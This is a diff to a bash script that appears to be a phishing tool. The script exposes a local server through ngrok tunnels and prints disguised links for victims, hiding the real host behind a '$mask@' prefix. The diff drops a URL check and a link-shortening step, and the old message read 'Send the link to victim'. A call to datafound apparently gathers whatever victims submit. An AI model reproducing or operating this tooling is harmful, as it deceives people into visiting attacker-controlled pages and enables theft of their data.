@@ -488,15 +488,6 @@ fi
 
 }
 
-validate() {
-    if [ ! "${1//:*}" = http ]; then
-        if [ ! "${1//:*}" = https ]; then
-            printf "\n\e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m  Ngrok was unable to Generate Link.. Try Again..\e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\n\n"
-            exit 1
-        fi
-    fi
-}
-
 start_ngrok() {
 
 printf "\e[0m\n"
@@ -509,14 +500,12 @@ sleep 2
 ./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 5
 ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-validate $ngrok_link
-linker=$(curl -s https://da.gd/s/?url=${ngrok_link})
-validate $linker
-linker2=${linker#https://}
+ngrok_link1=${ngrok_link#https://}
 sleep 3
 banner
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $mask@$linker2
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Link 1 :\e[0m\e[1;92m %s \n\n" $ngrok_link
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Link 2 :\e[0m\e[1;92m http://%s \n\n" $mask@$ngrok_link1
 datafound
 
 }
@@ -533,14 +522,12 @@ sleep 2
 ./.htr/ngrok2 http 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 5
 ngrok_link2=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-validate $ngrok_link2
-linker1=$(curl -s https://da.gd/s/?url=${ngrok_link2})
-validate $linker1
-linker21=${linker1#https://}
+ngrok_link3=${ngrok_link2#https://}
 sleep 3
 banner
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $mask@$linker21
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Link 1 :\e[0m\e[1;92m %s \n\n" $ngrok_link2
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Link 2 :\e[0m\e[1;92m http://%s \n\n" $mask@$ngrok_link3
 datafound
 
 }
